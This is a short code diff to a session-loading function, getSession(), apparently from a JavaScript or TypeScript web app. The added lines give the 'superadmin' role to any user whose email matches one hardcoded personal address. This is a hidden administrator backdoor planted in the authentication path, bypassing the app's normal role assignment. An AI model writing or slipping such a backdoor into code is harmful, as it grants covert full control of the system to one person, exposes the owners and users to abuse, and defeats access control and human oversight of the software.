@@ -19,6 +19,10 @@ export async function getSession() {
     where: { id: userId }
   });
   
+  if (user && user.email === 'ksh128395@gmail.com') {
+    user.role = 'superadmin';
+  }
+  
   return user;
 }
 
